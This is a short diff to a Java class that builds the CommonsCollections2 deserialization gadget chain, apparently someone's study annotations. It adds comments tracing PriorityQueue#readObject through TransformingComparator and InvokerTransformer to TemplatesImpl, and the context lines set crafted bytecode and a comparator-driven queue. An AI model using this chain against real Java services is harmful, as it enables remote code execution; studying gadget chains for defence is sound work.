@@ -29,6 +29,16 @@ public class CommonsCollections2TemplatesImpl {
         return clazz.toBytecode();
     }
 
+    /**
+     * PriorityQueue#readObject()
+     * PriorityQueue#heapify()
+     * PriorityQueue#siftDown()
+     * PriorityQueue#siftDownUsingComparator()
+     *      TransformingComparator#compare(obj1,obj2)
+     *          InvokerTransformer#transform(obj1) === newTransformer.invoke(templatesImpl)
+     */
+
+
     public static void main(String[] args) throws Exception {
         TemplatesImpl obj = new TemplatesImpl();
         setFieldValue(obj, "_bytecodes", new byte[][]{getBytescode()});
@@ -38,6 +48,8 @@ public class CommonsCollections2TemplatesImpl {
         Transformer transformer = new InvokerTransformer("toString", null, null);
         Comparator comparator = new TransformingComparator(transformer);
         PriorityQueue queue = new PriorityQueue(2, comparator);
+        // 把obj放入queue中，obj就会传递给transformer.transform。这样就可以不用使用Transformer数组。
+        // TransformingComparator.compare(obj1,obj2)-->transformer.transform(obj1),transformer.transform(obj2)
         queue.add(obj);
         queue.add(obj);
 
